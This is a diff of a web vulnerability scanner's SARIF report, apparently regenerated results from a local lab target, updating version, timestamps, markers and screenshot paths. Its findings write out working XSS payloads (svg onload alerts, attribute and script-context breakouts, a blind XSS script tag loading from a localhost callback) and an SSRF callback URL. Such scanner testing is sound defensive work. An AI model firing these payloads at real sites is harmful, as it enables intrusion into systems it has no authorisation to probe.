@@ -7,7 +7,7 @@
         "driver": {
           "name": "SV1",
           "fullName": "SV1 web vulnerability scanner",
-          "version": "1.2.0",
+          "version": "1.2.1",
           "rules": [
             {
               "id": "SV1/SQLI/boolean",
@@ -279,8 +279,8 @@
       "invocations": [
         {
           "executionSuccessful": true,
-          "startTimeUtc": "1970-01-01T02:14:41Z",
-          "endTimeUtc": "1970-01-01T02:17:25Z"
+          "startTimeUtc": "1970-01-01T00:23:07Z",
+          "endTimeUtc": "1970-01-01T00:25:50Z"
         }
       ],
       "columnKind": "utf16CodeUnits",
@@ -701,7 +701,7 @@
           "ruleIndex": 4,
           "level": "error",
           "message": {
-            "text": "SSRF HIGH (CONFIRMED) at GET http://127.0.0.1:8099/fetch [url] - target fetched http://127.0.0.1:8777/t/e5d386c5d0ae0711 at 22:44:55 from 127.0.0.1 (Python-urllib/3.14); response status 200"
+            "text": "SSRF HIGH (CONFIRMED) at GET http://127.0.0.1:8099/fetch [url] - target fetched http://127.0.0.1:8777/t/971b04127129419b at 07:28:49 from 127.0.0.1 (Python-urllib/3.14); response status 200"
           },
           "locations": [
             {
@@ -724,15 +724,15 @@
             "kind": "SSRF",
             "method": "GET",
             "param": "url",
-            "payload": "http://127.0.0.1:8777/t/e5d386c5d0ae0711",
+            "payload": "http://127.0.0.1:8777/t/971b04127129419b",
             "technique": "ssrf-oob",
-            "evidence": "target fetched http://127.0.0.1:8777/t/e5d386c5d0ae0711 at 22:44:55 from 127.0.0.1 (Python-urllib/3.14); response status 200",
+            "evidence": "target fetched http://127.0.0.1:8777/t/971b04127129419b at 07:28:49 from 127.0.0.1 (Python-urllib/3.14); response status 200",
             "detail": "url-like parameter made a server side request to the callback host",
             "data": {
               "oob": "fetched",
               "from": "127.0.0.1",
               "agent": "Python-urllib/3.14",
-              "time": "22:44:55"
+              "time": "07:28:49"
             },
             "artifact": "",
             "security-severity": "8.0"
@@ -743,7 +743,7 @@
           "ruleIndex": 9,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/api/fetch [name] - executed in chromium: alert:sv19ec83caa"
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/api/fetch [name] - executed in chromium: alert:sv1f375c0db"
           },
           "locations": [
             {
@@ -766,12 +766,12 @@
             "kind": "XSS",
             "method": "GET",
             "param": "name",
-            "payload": "<svg/onload=alert('sv19ec83caa')>sv19ec83caa",
+            "payload": "<svg/onload=alert('sv1f375c0db')>sv1f375c0db",
             "technique": "reflected/text",
-            "evidence": "executed in chromium: alert:sv19ec83caa",
+            "evidence": "executed in chromium: alert:sv1f375c0db",
             "detail": "in HTML text flow | proof: alert fired",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/xss-08.png",
+            "artifact": "lab-artifacts-1.2.1/xss-08.png",
             "security-severity": "8.0"
           }
         },
@@ -780,7 +780,7 @@
           "ruleIndex": 9,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/api/spa [name] - executed in chromium: alert:sv197d3b2dc"
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/api/spa [name] - executed in chromium: alert:sv1ebee6fd5"
           },
           "locations": [
             {
@@ -803,12 +803,12 @@
             "kind": "XSS",
             "method": "GET",
             "param": "name",
-            "payload": "<svg/onload=alert('sv197d3b2dc')>sv197d3b2dc",
+            "payload": "<svg/onload=alert('sv1ebee6fd5')>sv1ebee6fd5",
             "technique": "reflected/text",
-            "evidence": "executed in chromium: alert:sv197d3b2dc",
+            "evidence": "executed in chromium: alert:sv1ebee6fd5",
             "detail": "in HTML text flow | proof: alert fired",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/xss-09.png",
+            "artifact": "lab-artifacts-1.2.1/xss-09.png",
             "security-severity": "8.0"
           }
         },
@@ -817,7 +817,7 @@
           "ruleIndex": 7,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/attr [q] - executed in chromium: alert:sv1372ce8bc"
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/attr [q] - executed in chromium: alert:sv1d0a15873"
           },
           "locations": [
             {
@@ -840,12 +840,12 @@
             "kind": "XSS",
             "method": "GET",
             "param": "q",
-            "payload": "sv1372ce8bc'><svg/onload=alert(\"sv1372ce8bc\")>",
+            "payload": "sv1d0a15873'><svg/onload=alert(\"sv1d0a15873\")>",
             "technique": "reflected/attr",
-            "evidence": "executed in chromium: alert:sv1372ce8bc",
+            "evidence": "executed in chromium: alert:sv1d0a15873",
             "detail": "inside <input> attribute value (single quoted) | proof: alert fired",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/xss-06.png",
+            "artifact": "lab-artifacts-1.2.1/xss-06.png",
             "security-severity": "8.0"
           }
         },
@@ -854,7 +854,7 @@
           "ruleIndex": 5,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/blind-admin [message] - callback executed on http://127.0.0.1:8099/blind-admin: /t fetched at 22:45:41, /e image at 22:45:41 from 127.0.0.1 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.8078.4 Safari/537.36)"
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/blind-admin [message] - callback executed on http://127.0.0.1:8099/blind-admin: /t fetched at 07:29:35, /e image at 07:29:35 from 127.0.0.1 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.8078.4 Safari/537.36)"
           },
           "locations": [
             {
@@ -877,18 +877,18 @@
             "kind": "XSS",
             "method": "GET",
             "param": "message",
-            "payload": "<script src=\"http://127.0.0.1:8777/t/5ae5f0a815c300c5\"></script>",
+            "payload": "<script src=\"http://127.0.0.1:8777/t/6ee6b54fdc3616ab\"></script>",
             "technique": "blind-oob",
-            "evidence": "callback executed on http://127.0.0.1:8099/blind-admin: /t fetched at 22:45:41, /e image at 22:45:41 from 127.0.0.1 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.8078.4 Safari/537.36)",
+            "evidence": "callback executed on http://127.0.0.1:8099/blind-admin: /t fetched at 07:29:35, /e image at 07:29:35 from 127.0.0.1 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.8078.4 Safari/537.36)",
             "detail": "blind xss: payload stored through POST http://127.0.0.1:8099/blind; the callback fired when the page rendered it",
             "data": {
               "oob": "executed",
               "from": "127.0.0.1",
               "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
-              "fetched": "22:45:41",
-              "time": "22:45:41"
+              "fetched": "07:29:35",
+              "time": "07:29:35"
             },
-            "artifact": "lab-artifacts-1.2.0/blind-01.png",
+            "artifact": "lab-artifacts-1.2.1/blind-01.png",
             "security-severity": "8.0"
           }
         },
@@ -925,7 +925,7 @@
             "evidence": "location.hash -> innerHTML: alert:sv1dom07ae084ce",
             "detail": "client side sink: decodeURIComponent(location.hash.slice(1));if (raw) { document.getElementById('out').innerHTML = raw; }",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/dom-01.png",
+            "artifact": "lab-artifacts-1.2.1/dom-01.png",
             "security-severity": "8.0"
           }
         },
@@ -934,7 +934,7 @@
           "ruleIndex": 9,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/dynamic [name] - executed in chromium: alert:sv1cd925b38"
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/dynamic [name] - executed in chromium: alert:sv1bcd12dbc"
           },
           "locations": [
             {
@@ -957,12 +957,12 @@
             "kind": "XSS",
             "method": "GET",
             "param": "name",
-            "payload": "<svg/onload=alert('sv1cd925b38')>sv1cd925b38",
+            "payload": "<svg/onload=alert('sv1bcd12dbc')>sv1bcd12dbc",
             "technique": "reflected/text",
-            "evidence": "executed in chromium: alert:sv1cd925b38",
+            "evidence": "executed in chromium: alert:sv1bcd12dbc",
             "detail": "in HTML text flow | proof: alert fired",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/xss-10.png",
+            "artifact": "lab-artifacts-1.2.1/xss-10.png",
             "security-severity": "8.0"
           }
         },
@@ -971,7 +971,7 @@
           "ruleIndex": 9,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/feedback [message] - executed in chromium: alert:sv1289e9ca6"
+            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/feedback [message] - executed in chromium: alert:sv13fdbecad"
           },
           "locations": [
             {
@@ -994,12 +994,12 @@
             "kind": "XSS",
             "method": "POST",
             "param": "message",
-            "payload": "<svg/onload=alert('sv1289e9ca6')>sv1289e9ca6",
+            "payload": "<svg/onload=alert('sv13fdbecad')>sv13fdbecad",
             "technique": "reflected/text",
-            "evidence": "executed in chromium: alert:sv1289e9ca6",
+            "evidence": "executed in chromium: alert:sv13fdbecad",
             "detail": "in HTML text flow | proof: alert fired",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/xss-03.png",
+            "artifact": "lab-artifacts-1.2.1/xss-03.png",
             "security-severity": "8.0"
           }
         },
@@ -1008,7 +1008,7 @@
           "ruleIndex": 9,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/feedback [name] - executed in chromium: alert:sv183a63714"
+            "text": "XSS HIGH (CONFIRMED) at POST http://127.0.0.1:8099/feedback [name] - executed in chromium: alert:sv14fe3049f"
           },
           "locations": [
             {
@@ -1031,12 +1031,12 @@
             "kind": "XSS",
             "method": "POST",
             "param": "name",
-            "payload": "<svg/onload=alert('sv183a63714')>sv183a63714",
+            "payload": "<svg/onload=alert('sv14fe3049f')>sv14fe3049f",
             "technique": "reflected/text",
-            "evidence": "executed in chromium: alert:sv183a63714",
+            "evidence": "executed in chromium: alert:sv14fe3049f",
             "detail": "in HTML text flow | proof: alert fired",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/xss-02.png",
+            "artifact": "lab-artifacts-1.2.1/xss-02.png",
             "security-severity": "8.0"
           }
         },
@@ -1073,7 +1073,7 @@
             "evidence": "stored through POST http://127.0.0.1:8099/guestbook and executed on http://127.0.0.1:8099/guestbook: alert:sv1stored11",
             "detail": "the payload was persisted by the application and ran on another page",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/stored-02.png",
+            "artifact": "lab-artifacts-1.2.1/stored-02.png",
             "security-severity": "8.0"
           }
         },
@@ -1110,7 +1110,7 @@
             "evidence": "stored through POST http://127.0.0.1:8099/guestbook and executed on http://127.0.0.1:8099/guestbook: alert:sv1stored10",
             "detail": "the payload was persisted by the application and ran on another page",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/stored-01.png",
+            "artifact": "lab-artifacts-1.2.1/stored-01.png",
             "security-severity": "8.0"
           }
         },
@@ -1119,7 +1119,7 @@
           "ruleIndex": 8,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/js [q] - executed in chromium: alert:sv1dfa5430f"
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/js [q] - executed in chromium: alert:sv1c1adc8c2"
           },
           "locations": [
             {
@@ -1142,12 +1142,12 @@
             "kind": "XSS",
             "method": "GET",
             "param": "q",
-            "payload": "0\";alert('sv1dfa5430f')//",
+            "payload": "0\";alert('sv1c1adc8c2')//",
             "technique": "reflected/script",
-            "evidence": "executed in chromium: alert:sv1dfa5430f",
+            "evidence": "executed in chromium: alert:sv1c1adc8c2",
             "detail": "inside a <script> block (double) | proof: alert fired",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/xss-05.png",
+            "artifact": "lab-artifacts-1.2.1/xss-05.png",
             "security-severity": "8.0"
           }
         },
@@ -1156,7 +1156,7 @@
           "ruleIndex": 9,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/search [q] - executed in chromium: alert:sv12a69272c"
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/search [q] - executed in chromium: alert:sv1932f1325"
           },
           "locations": [
             {
@@ -1179,12 +1179,12 @@
             "kind": "XSS",
             "method": "GET",
             "param": "q",
-            "payload": "<svg/onload=alert('sv12a69272c')>sv12a69272c",
+            "payload": "<svg/onload=alert('sv1932f1325')>sv1932f1325",
             "technique": "reflected/text",
-            "evidence": "executed in chromium: alert:sv12a69272c",
+            "evidence": "executed in chromium: alert:sv1932f1325",
             "detail": "in HTML text flow | proof: alert fired",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/xss-01.png",
+            "artifact": "lab-artifacts-1.2.1/xss-01.png",
             "security-severity": "8.0"
           }
         },
@@ -1193,7 +1193,7 @@
           "ruleIndex": 9,
           "level": "error",
           "message": {
-            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/waf [q] - executed in chromium: alert:sv10dc97778"
+            "text": "XSS HIGH (CONFIRMED) at GET http://127.0.0.1:8099/waf [q] - executed in chromium: alert:sv1ae04fa4d"
           },
           "locations": [
             {
@@ -1216,12 +1216,12 @@
             "kind": "XSS",
             "method": "GET",
             "param": "q",
-            "payload": "<svg/onload=alert('sv10dc97778')>sv10dc97778",
+            "payload": "<svg/onload=alert('sv1ae04fa4d')>sv1ae04fa4d",
             "technique": "reflected/text",
-            "evidence": "executed in chromium: alert:sv10dc97778",
+            "evidence": "executed in chromium: alert:sv1ae04fa4d",
             "detail": "in HTML text flow | proof: alert fired",
             "data": {},
-            "artifact": "lab-artifacts-1.2.0/xss-07.png",
+            "artifact": "lab-artifacts-1.2.1/xss-07.png",
             "security-severity": "8.0"
           }
         },
@@ -1267,7 +1267,7 @@
           "ruleIndex": 10,
           "level": "warning",
           "message": {
-            "text": "XSS MEDIUM (MEDIUM) at GET http://127.0.0.1:8099/safe [q] - <html><body><h1>safe</h1><div>sv103ddd761</div></body></html>"
+            "text": "XSS MEDIUM (MEDIUM) at GET http://127.0.0.1:8099/safe [q] - <html><body><h1>safe</h1><div>sv1e80650ed</div></body></html>"
           },
           "locations": [
             {
@@ -1292,7 +1292,7 @@
             "param": "q",
             "payload": "<svg/onload=alert(1)>",
             "technique": "reflection-encoded",
-            "evidence": "<html><body><h1>safe</h1><div>sv103ddd761</div></body></html>",
+            "evidence": "<html><body><h1>safe</h1><div>sv1e80650ed</div></body></html>",
             "detail": "input reaches the page (in HTML text flow) but markup was encoded or stripped (9 payloads reflected)",
             "data": {},
             "artifact": "",
@@ -1303,7 +1303,7 @@
       "properties": {
         "target": "http://127.0.0.1:8099/",
         "tool_author": "ee.zvz",
-        "duration_seconds": 164.4,
+        "duration_seconds": 163.39,
         "requests": 853,
         "scanners": [
           "xss",
